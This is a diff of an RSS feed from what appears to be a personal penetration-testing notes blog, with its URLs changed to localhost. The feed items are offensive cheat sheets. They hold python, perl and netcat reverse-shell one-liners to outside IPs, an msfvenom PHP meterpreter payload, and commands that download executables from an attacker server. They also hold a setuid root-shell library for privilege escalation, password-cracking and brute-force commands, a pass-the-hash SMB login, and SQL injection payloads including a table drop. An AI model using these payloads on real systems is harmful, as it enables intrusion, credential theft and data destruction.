@@ -2,49 +2,49 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Posts on </title>
-    <link>https://sosprz.github.io/posts/</link>
+    <link>localhost/posts/</link>
     <description>Recent content in Posts on </description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <lastBuildDate>Sun, 30 Dec 2018 08:53:12 +0100</lastBuildDate>
     
-	<atom:link href="https://sosprz.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="localhost/posts/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>cmd</title>
-      <link>https://sosprz.github.io/posts/cmd/</link>
+      <link>localhost/posts/cmd/</link>
       <pubDate>Sun, 30 Dec 2018 08:53:12 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/cmd/</guid>
+      <guid>localhost/posts/cmd/</guid>
       <description> type dir /ah whoami dir /s where /r c:\Windows bash.* START filenae.lnk where /r c:\ wsl.conf wget http://10.10.18.70:8000/taskkill.exe -OutFile taskkill.exe Invoke-WebRequest http://10.10.18.70:8000/taskkill.exe -OutFile taskkill.exe Restart-Service -Name &#34;Ubiquiti UniFi Video&#34; Stop-Service -Name &#34;Ubiquiti UniFi Video&#34;  </description>
     </item>
     
     <item>
       <title>firewall evasion</title>
-      <link>https://sosprz.github.io/posts/firewall-evasion/</link>
+      <link>localhost/posts/firewall-evasion/</link>
       <pubDate>Sun, 23 Dec 2018 11:26:23 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/firewall-evasion/</guid>
+      <guid>localhost/posts/firewall-evasion/</guid>
       <description>Firewall source port scan, found port 987 and bind to localhost.
  /usr/bin/nmap 192.168.5.2 -Pn &amp;ndash;source-port=53 -f /usr/bin/ncat -l 678 &amp;ndash;sh-exec &amp;ldquo;ncat 192.168.5.2 987 -p 53&amp;rdquo; ssh dave@localhost -p 678</description>
     </item>
     
     <item>
       <title>av evasion</title>
-      <link>https://sosprz.github.io/posts/av-evasion/</link>
+      <link>localhost/posts/av-evasion/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/av-evasion/</guid>
+      <guid>localhost/posts/av-evasion/</guid>
       <description>https://github.com/oddcod3/Phantom-Evasion</description>
     </item>
     
     <item>
       <title>bash commands</title>
-      <link>https://sosprz.github.io/posts/bash-commands/</link>
+      <link>localhost/posts/bash-commands/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/bash-commands/</guid>
+      <guid>localhost/posts/bash-commands/</guid>
       <description>#www server  python -m SimpleHTTPServer 8000 
 #on our kali machine we run:
 nc -lvnp 7734 
@@ -62,10 +62,10 @@ cat lists |sed &amp;rsquo;s/^.*://&amp;rsquo; &amp;gt; md5 awk -F &amp;ldquo;:&a
     
     <item>
       <title>bash scripts</title>
-      <link>https://sosprz.github.io/posts/bash-scrips/</link>
+      <link>localhost/posts/bash-scrips/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/bash-scrips/</guid>
+      <guid>localhost/posts/bash-scrips/</guid>
       <description>Ping
 #!/bin/bash echo &amp;ldquo;first three octets of network to scan, end with a .&amp;rdquo; read network for host in {1..254}; do ping -c1 $network$host &amp;amp;&amp;gt;/dev/null; [ $? -eq 0 ] &amp;amp;&amp;amp; echo &amp;ldquo;$network$host is up&amp;rdquo; echo &amp;ldquo;done checking host: &amp;ldquo; $network$host done 
 Portscan #!/bin/bash echo &amp;ldquo;host to portscan: &amp;ldquo; read host for port in {1..65000}; do (echo &amp;gt; /dev/tcp/$host/$port) &amp;amp;&amp;gt;/dev/null [ $? -eq 0 ] &amp;amp;&amp;amp; echo &amp;ldquo;$port open&amp;rdquo; done</description>
@@ -73,29 +73,29 @@ Portscan #!/bin/bash echo &amp;ldquo;host to portscan: &amp;ldquo; read host for
     
     <item>
       <title>ctf tools</title>
-      <link>https://sosprz.github.io/posts/ctf-tools/</link>
+      <link>localhost/posts/ctf-tools/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/ctf-tools/</guid>
+      <guid>localhost/posts/ctf-tools/</guid>
       <description>#pspy 32 &amp;amp; 64 bit
 https://github.com/DominicBreuker/pspy</description>
     </item>
     
     <item>
       <title>ldap</title>
-      <link>https://sosprz.github.io/posts/ldap/</link>
+      <link>localhost/posts/ldap/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/ldap/</guid>
+      <guid>localhost/posts/ldap/</guid>
       <description>jxplorer</description>
     </item>
     
     <item>
       <title>links</title>
-      <link>https://sosprz.github.io/posts/links/</link>
+      <link>localhost/posts/links/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/links/</guid>
+      <guid>localhost/posts/links/</guid>
       <description>https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
 https://github.com/pentestmonkey/unix-privesc-check
 https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
@@ -107,38 +107,38 @@ https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/ htt
     
     <item>
       <title>metasploit</title>
-      <link>https://sosprz.github.io/posts/metasploit/</link>
+      <link>localhost/posts/metasploit/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/metasploit/</guid>
+      <guid>localhost/posts/metasploit/</guid>
       <description>#ssh user enum search enumusers use options set USER_FILE run 
 #php, image reverse shell #php4,php5  msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.1 lport=8888 -f raw msfconsole handler -p php/meterpreter/reverse_tcp -P 8888 -H 192.168.0.1</description>
     </item>
     
     <item>
       <title>nmap</title>
-      <link>https://sosprz.github.io/posts/nmap/</link>
+      <link>localhost/posts/nmap/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/nmap/</guid>
+      <guid>localhost/posts/nmap/</guid>
       <description>nmap -sC -sV -oA nmap/hostname ip nmap -n -T4 -sS -sV -sC -oA nmap/hostname ip nmap -v -sS -p- -A -T4 -oA nmap/hostname ip nmap -v -sU -sS -p- -A -T4 -oA nmap/hostname ip nmap -p 80 &amp;ndash;script http-shellshock &amp;ndash;script-args uri=/cgi-bin/vulnscript.sh ip nmap -p 3306 &amp;ndash;script mysql-brute ip nmap -sV &amp;ndash;script=http-enum ip nmap -sV &amp;ndash;script=nfs-showmount ip nmap -sV &amp;ndash;script ssl-enum-ciphers -p 443 ip nmap -p445 &amp;ndash;script smb-vuln-ms17-010 ip nmap &amp;ndash;script smb-brute.</description>
     </item>
     
     <item>
       <title>openssl</title>
-      <link>https://sosprz.github.io/posts/openssl/</link>
+      <link>localhost/posts/openssl/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/openssl/</guid>
+      <guid>localhost/posts/openssl/</guid>
       <description>https://github.com/glv2/bruteforce-salted-openssl</description>
     </item>
     
     <item>
       <title>passwords</title>
-      <link>https://sosprz.github.io/posts/password/</link>
+      <link>localhost/posts/password/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/password/</guid>
+      <guid>localhost/posts/password/</guid>
       <description>#john
 john &amp;ndash;format=crypt &amp;ndash;wordlist=rockyou.txt &amp;ndash;session=two hashes.txt john &amp;ndash;format=NT &amp;ndash;rules -w=/usr/share/wordlists/rockyou.txt hashfile.txt
 john &amp;ndash;format=netntlmv2 hash.txt &amp;ndash;wordlist=/usr/share/wordlists/rockyou.txt #hydra hydra -l admin docker.hackthebox.eu -s 44661 -P /usr/share/wordlists/rockyou.txt http-post-form &amp;lsquo;/index.php:password=^PASS^:F=Invalid password!&amp;rsquo; hydra -L users -P passwords 10.10.10.111 ssh hydra 10.10.10.153 http-post-form &amp;ldquo;/moodle/login/index.php:username=^USER^&amp;amp;password=^PASS^:F=Invalid login, please try again&amp;rdquo; -l giovanni -P list -t 10 -w 30 hash-identifier
@@ -147,10 +147,10 @@ john &amp;ndash;format=netntlmv2 hash.txt &amp;ndash;wordlist=/usr/share/wordlis
     
     <item>
       <title>privesc-libseclogin</title>
-      <link>https://sosprz.github.io/posts/privecs-libseclogin/</link>
+      <link>localhost/posts/privecs-libseclogin/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/privecs-libseclogin/</guid>
+      <guid>localhost/posts/privecs-libseclogin/</guid>
       <description>touch libseclogin.c  #include  #include  #include  #include  void seclogin() { setuid(0); setgid(0); execl(&amp;ldquo;/bin/bash&amp;rdquo;,&amp;ldquo;sh&amp;rdquo;,(char *)0); } int main(void) { seclogin(); } 
 Compile the code with /usr/share/bash-completion/completions/gcc -shared -o libseclogin.so -fPIC libseclogin.c
 cp libseclogin.so to /tmp
@@ -160,29 +160,29 @@ cd /etc/ld.so.conf.d ldconfig test.conf #(test.conf write /tmp) #it will give th
     
     <item>
       <title>shell</title>
-      <link>https://sosprz.github.io/posts/shell/</link>
+      <link>localhost/posts/shell/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/shell/</guid>
+      <guid>localhost/posts/shell/</guid>
       <description> export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH export SHELL=/bin/bash tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python -c import pty; pty.spawn(&#34;/bin/bash&#34;) python3 -c import pty; pty.spawn(&#39;/bin/bash&#39;) echo os.system(&#39;/bin/bash&#39;) /bin/sh -i echo &#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;  /tmp/asdf.py python /tmp/asdf.py  </description>
     </item>
     
     <item>
       <title>shell esc</title>
-      <link>https://sosprz.github.io/posts/shell-esc/</link>
+      <link>localhost/posts/shell-esc/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/shell-esc/</guid>
+      <guid>localhost/posts/shell-esc/</guid>
       <description>export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH export SHELL=/bin/bash
 tar cf /dev/null ~/b &amp;ndash;checkpoint=1 &amp;ndash;checkpoint-action=exec=/bin/bash</description>
     </item>
     
     <item>
       <title>shell reverse</title>
-      <link>https://sosprz.github.io/posts/shell_reverse/</link>
+      <link>localhost/posts/shell_reverse/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/shell_reverse/</guid>
+      <guid>localhost/posts/shell_reverse/</guid>
       <description>python3 -c &amp;lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;ldquo;10.10.10.10&amp;rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;ldquo;/bin/sh&amp;rdquo;,&amp;ldquo;-i&amp;rdquo;]);&amp;rsquo;
 perl -e &amp;lsquo;use Socket;$i=&amp;ldquo;10.10.10.10&amp;rdquo;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;ldquo;tcp&amp;rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDOUT,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDERR,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);exec(&amp;ldquo;/bin/sh -i&amp;rdquo;);};&amp;rsquo;
 nc -e /bin/sh 10.0.0.1 1234
@@ -196,78 +196,78 @@ nc -lp 1&amp;gt;/tmp/b
     
     <item>
       <title>shell search</title>
-      <link>https://sosprz.github.io/posts/shell_search/</link>
+      <link>localhost/posts/shell_search/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/shell_search/</guid>
+      <guid>localhost/posts/shell_search/</guid>
       <description>#capabilities getcap -r / 2/dev/null #grep recursive grep -RIlm1 &#34;bash&#34; /skrypty/ #sticky bit find / -perm -1000 -type d -exec la -la {} \; 2/dev/null #sgid chmod 2000 find / -perm -g=s -type f -exec ls -la {} \; 2/dev/null #SUID chmod 4000 find / -perm -u=s -type f -exec ls -la {} \; 2/dev/null find / -user root -perm -o=w -type f -not -path &#34;/proc/*&#34; -exec ls -la {} \; 2/dev/null find / -type f -perm -g=rw -user root  -sudo -l</description>
     </item>
     
     <item>
       <title>smb</title>
-      <link>https://sosprz.github.io/posts/smb/</link>
+      <link>localhost/posts/smb/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/smb/</guid>
+      <guid>localhost/posts/smb/</guid>
       <description>#user % hash smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B &amp;ndash;pw-nt-hash -W YPUFFY -L 10.10.10.107
 #Allow to login to smb share smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B &amp;ndash;pw-nt-hash -W YPUFFY \\10.10.10.107\alice</description>
     </item>
     
     <item>
       <title>sqli</title>
-      <link>https://sosprz.github.io/posts/sqli/</link>
+      <link>localhost/posts/sqli/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/sqli/</guid>
+      <guid>localhost/posts/sqli/</guid>
       <description>#sql injection userName = Smith&amp;rsquo; or &amp;lsquo;1&amp;rsquo;=&amp;lsquo;1 userName =&amp;rsquo; or 1=1 &amp;ndash; userID = 1234567 or 1=1 UserName = Smith’;drop table users; truncate audit_log;&amp;ndash;</description>
     </item>
     
     <item>
       <title>sqlmap</title>
-      <link>https://sosprz.github.io/posts/sqlmap/</link>
+      <link>localhost/posts/sqlmap/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/sqlmap/</guid>
+      <guid>localhost/posts/sqlmap/</guid>
       <description>&amp;ndash;dbs &amp;ndash;tables -D &amp;ndash;columns -D master -T sys.master_key_passwords &amp;ndash;dump -D master -T sys.master_key_passwords -f -b &amp;ndash;current-db &amp;ndash;current-user &amp;ndash;users &amp;ndash;passwords -v 1
 sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1 &amp;ndash;sql-query=&amp;ldquo;EXEC master..xp_dirtree &amp;lsquo;\\10.10.18.70\test&amp;rsquo; &amp;ndash; &amp;ldquo;</description>
     </item>
     
     <item>
       <title>ssh</title>
-      <link>https://sosprz.github.io/posts/ssh/</link>
+      <link>localhost/posts/ssh/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/ssh/</guid>
+      <guid>localhost/posts/ssh/</guid>
       <description>#putty puttygen my_private_key.ppk -O private-openssh -o keyfile
 #ssh ssh -i keyfile root@10.10.10.107</description>
     </item>
     
     <item>
       <title>stego</title>
-      <link>https://sosprz.github.io/posts/stego/</link>
+      <link>localhost/posts/stego/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/stego/</guid>
+      <guid>localhost/posts/stego/</guid>
       <description>steghide export -sf file.jpg
 ./stegcracker ../../Hackthebox/Stego/beatles/BAND.JPG ../../app/rockyou.txt</description>
     </item>
     
     <item>
       <title>www dir scan</title>
-      <link>https://sosprz.github.io/posts/www-dir-scan/</link>
+      <link>localhost/posts/www-dir-scan/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/www-dir-scan/</guid>
+      <guid>localhost/posts/www-dir-scan/</guid>
       <description> dirb -h cewl seclists gobuster -u http://10.10.10.111:1880 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt gobuster -u http://10.10.10.111:9999/backup -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt #with -x -m it will be search txt,html gobuster -u http://10.10.10.111/dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -x -m gobuster -u http://10.10.10.111/dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -x html  #vhost enum nmap &amp;ndash;script http-vhosts -p 80,443 10.10.10.113 
  git clone https://github.com/jobertabma/virtual-host-discovery ruby scan.rb --ip=10.10.10.1 --host=domein.ltd -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt  </description>
     </item>
     
     <item>
       <title>xss</title>
-      <link>https://sosprz.github.io/posts/xss/</link>
+      <link>localhost/posts/xss/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://sosprz.github.io/posts/xss/</guid>
+      <guid>localhost/posts/xss/</guid>
       <description>xsser -u</description>
     </item>
     
